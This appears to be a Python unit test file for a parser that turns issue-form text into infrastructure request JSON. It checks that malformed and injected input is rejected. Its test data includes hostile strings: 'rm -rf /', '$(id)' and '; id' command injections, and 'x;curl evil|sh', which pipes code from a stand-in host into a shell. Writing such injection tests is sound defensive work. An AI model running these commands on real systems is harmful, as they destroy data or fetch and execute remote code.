"""Unit tests for the Issue Form -> request.json parser. Run: python -m unittest discover -s tests"""
import json
import subprocess
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "tools"))
from form_fields import CONFIRM_TEXT  # noqa: E402
from issue_to_request import convert  # noqa: E402

GOOD = f"""### Application name

sample-app01

### Environment

lab

### Size

medium

### OS image

rhel8-std

### Network profile

app-lab

### Middleware

jboss

### Data disk size (GB)

200

### Owner (team or user id)

_No response_

### Lifetime in days

7

### Confirmation

- [x] {CONFIRM_TEXT}
"""


def validate(req: dict) -> int:
    path = ROOT / ".state" / "t_request.json"
    path.parent.mkdir(exist_ok=True)
    path.write_text(json.dumps(req))
    return subprocess.run([sys.executable, str(ROOT / "tools/validate_contract.py"),
                           str(ROOT / "contracts/request.v1.schema.json"), str(path)],
                          capture_output=True).returncode


class ParserTests(unittest.TestCase):
    def test_good_body_round_trips_and_validates(self):
        req, errors = convert(GOOD, 42)
        self.assertEqual(errors, [])
        self.assertEqual(req["request_id"], "REQ-0042")
        self.assertEqual(req["data_disk_gb"], 200)
        self.assertNotIn("owner", req)               # "_No response_" is dropped, not stored
        self.assertEqual(validate(req), 0)

    def test_windows_line_endings(self):
        req, errors = convert(GOOD.replace("\n", "\r\n"), 1)
        self.assertEqual(errors, [])

    def test_unknown_heading_is_rejected(self):
        _, errors = convert(GOOD + "\n### Run this command\n\nrm -rf /\n", 1)
        self.assertTrue(any("Unknown form field" in e for e in errors))

    def test_text_before_first_field_is_rejected(self):
        _, errors = convert("hello\n\n" + GOOD, 1)
        self.assertTrue(any("before the first form field" in e for e in errors))

    def test_duplicate_field_is_rejected(self):
        _, errors = convert(GOOD + "\n### Size\n\nlarge\n", 1)
        self.assertTrue(any("Duplicate" in e for e in errors))

    def test_unticked_confirmation_is_rejected(self):
        _, errors = convert(GOOD.replace("- [x]", "- [ ]"), 1)
        self.assertTrue(any("checkbox" in e for e in errors))

    def test_missing_required_field_is_rejected(self):
        _, errors = convert(GOOD.replace("### Size\n\nmedium\n\n", ""), 1)
        self.assertTrue(any("Missing required field: 'Size'" in e for e in errors))

    def test_multiline_value_is_rejected(self):
        _, errors = convert(GOOD.replace("sample-app01", "sample-app01\nextra: $(id)"), 1)
        self.assertTrue(any("single line" in e for e in errors))

    def test_non_numeric_number_is_rejected(self):
        _, errors = convert(GOOD.replace("200", "200; id"), 1)
        self.assertTrue(any("whole number" in e for e in errors))

    def test_oversized_body_is_rejected(self):
        _, errors = convert("x" * 30000, 1)
        self.assertTrue(any("too large" in e for e in errors))

    def test_injection_attempt_passes_parser_but_fails_schema(self):
        # The parser does not interpret values; the schema is the second gate.
        req, errors = convert(GOOD.replace("sample-app01", "x;curl evil|sh"), 1)
        self.assertEqual(errors, [])
        self.assertNotEqual(validate(req), 0)


if __name__ == "__main__":
    unittest.main()
